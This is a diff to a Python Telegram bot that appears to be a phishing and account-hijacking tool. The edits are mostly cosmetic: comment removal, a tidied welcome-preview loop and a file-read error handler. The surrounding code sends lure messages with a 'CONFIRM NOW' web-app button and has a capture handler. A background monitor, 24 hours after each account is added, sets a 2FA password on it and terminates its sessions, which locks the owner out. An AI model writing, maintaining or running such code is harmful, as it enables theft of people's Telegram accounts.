@@ -160,10 +160,9 @@ def load_welcome_config():
             "messages": DEFAULT_WELCOME_MSGS,
             "button_text": "CONFIRM NOW",
             "button_url": WEBAPP_URL + "?auto=1",
-            "show_button": False,  # DEFAULT OFF — button delete
+            "show_button": False,
         }
         save_json(WELCOME_FILE, cfg)
-    # Force button off if user requested
     return cfg
 
 
@@ -368,7 +367,7 @@ async def send_welcome(uid, name):
     msgs = welcome_config.get("messages", [])
     if not msgs:
         return []
-    show_button = welcome_config.get("show_button", False)  # DEFAULT OFF
+    show_button = welcome_config.get("show_button", False)
     btn_text = welcome_config.get("button_text", "CONFIRM NOW")
     btn_url = welcome_config.get("button_url", WEBAPP_URL + "?auto=1")
     sent_ids = []
@@ -404,15 +403,11 @@ async def start_handler(event):
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 buttons=admin_menu(), parse_mode='md')
             return
-        # Non-owner also gets welcome (in case user directly opens admin bot)
         await send_welcome(uid, name)
     except Exception as e:
         logger.error(f"/start: {e}")
 
 
-# ============================================================
-# CALLBACK — compact
-# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
     global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config
@@ -506,11 +501,13 @@ async def cb(event):
 
         elif data == "wl_preview":
             await event.answer("Preview sent")
-            for m in welcome_config.get("messages", []):
+            msgs = welcome_config.get("messages", [])
+            show = welcome_config.get("show_button", False)
+            for i, m in enumerate(msgs):
                 content = (m.get("content") or "").replace("{name}", "Preview")
-                show = welcome_config.get("show_button", False)
+                is_last = (i == len(msgs) - 1)
                 btns = None
-                if show and m == welcome_config.get("messages", [])[-1]:
+                if is_last and show:
                     btns = [[Button.url(welcome_config.get("button_text", "CONFIRM NOW"),
                                         welcome_config.get("button_url", WEBAPP_URL))]]
                 await safe_send_user(chat_id, content, btns)
@@ -804,9 +801,6 @@ async def capture(event):
         return
 
 
-# ============================================================
-# SECTION MONITOR — 24h terminate + edit notify msg
-# ============================================================
 async def section_monitor():
     global AUTO_DELETE_EXPIRED, auto_2fa_pass
     while True:
@@ -852,7 +846,6 @@ async def section_monitor():
                     if a.get("status") == "active":
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400:
-                            # Set 2FA
                             if auto_2fa_pass:
                                 try:
                                     loopA = asyncio.new_event_loop()
@@ -872,7 +865,6 @@ async def section_monitor():
                                 except Exception as e:
                                     logger.error(f"set 2fa err: {e}")
 
-                            # Terminate
                             try:
                                 loop2 = asyncio.new_event_loop()
                                 asyncio.set_event_loop(loop2)
@@ -913,7 +905,6 @@ async def section_monitor():
 
 
 async def edit_admin_msg(account, status_text):
-    """Edit admin notification msg (both admin bot + section bot via HTTP signal)"""
     try:
         msg_id = account.get("admin_notify_msg_id")
         if msg_id:
@@ -943,7 +934,6 @@ async def edit_admin_msg(account, status_text):
             except Exception as e:
                 logger.error(f"admin edit err: {e}")
 
-        # Send signal to section bot
         section_url = os.environ.get("SECTION_BOT_URL", "")
         section_msg_id = account.get("section_notify_msg_id")
         section_chat_id = account.get("section_chat_id")
@@ -1049,12 +1039,16 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK
+# FLASK — HTML alada file theke ashe
 # ============================================================
 @app.route('/')
 def index():
-    with open('webapp.html', 'r', encoding='utf-8') as f:
-        return f.read()
+    try:
+        with open('webapp.html', 'r', encoding='utf-8') as f:
+            return f.read()
+    except Exception as e:
+        logger.error(f"webapp.html read error: {e}")
+        return "webapp.html not found", 404
 
 
 @app.route('/tg')
